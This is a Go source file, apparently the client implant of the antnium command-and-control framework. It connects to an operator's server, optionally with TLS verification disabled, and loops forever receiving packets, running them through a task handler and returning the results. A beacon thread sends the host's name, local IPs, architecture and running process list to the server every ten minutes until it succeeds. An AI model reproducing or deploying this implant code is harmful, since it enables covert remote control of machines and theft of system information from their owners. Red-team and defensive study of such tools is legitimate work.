package client

import (
	"crypto/tls"
	"errors"
	"math/rand"
	"net/http"
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   *ClientConfig
	Campaign *model.Campaign

	Upstream          Upstream
	DownstreamManager DownstreamManager
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	upstream := MakeUpstreamHttp(&config, &campaign)
	downstreamManager := MakeDownstreamManager()

	w := Client{
		&config,
		&campaign,
		&upstream,
		downstreamManager,
	}
	return w
}

func (s *Client) Start() {
	if s.Config.InsecureTls {
		// Enable SkipVerify on all instances of http
		// https://stackoverflow.com/questions/12122159/how-to-do-a-https-request-with-bad-certificate
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	// "Connect" to the server, mostly to check if we have internet connection and are not blocked
	s.Upstream.Connect()
	go s.Upstream.Start()

	//s.DownstreamManager.StartListeners(s) // FIXME make optional
	go s.sendPing() // Thread: sendPing

	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-s.Upstream.Channel()

		p, err := s.DownstreamManager.Do(p)
		if err != nil {
			log.Error("Err: ", err.Error())
		}

		// Send answer back to server
		s.Upstream.Channel() <- p
	}
}

// sendPing is a Thread which tries to send initial ping packet to the server, lifetime: until success
func (s *Client) sendPing() {
	arguments := make(model.PacketArgument)

	response := make(model.PacketResponse)
	response["hostname"] = s.Config.Hostname
	model.AddArrayToResponse("localIp", s.Config.LocalIps, response)
	response["arch"] = s.Config.Arch
	model.AddArrayToResponse("processes", s.Config.Processes, response)

	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
	for {
		err := s.Upstream.SendOutofband(packet)
		if err == nil {
			break // when no error -> success
		}
		time.Sleep(time.Minute * 10) // 10mins for now
	}
}

// SendDownstreams is used to notify server about any new downstreams
func (s *Client) SendDownstreams(downstreams []DownstreamInfo) error {
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)

	for idx, downstreamInfo := range downstreams {
		idxStr := strconv.Itoa(idx)
		response["name"+idxStr] = downstreamInfo.Name
		response["info"+idxStr] = downstreamInfo.Info
	}

	packet := model.NewPacket("downstreams", s.Config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)

	err := s.Upstream.SendOutofband(packet)
	if err != nil {
		return err
	}

	return nil
}
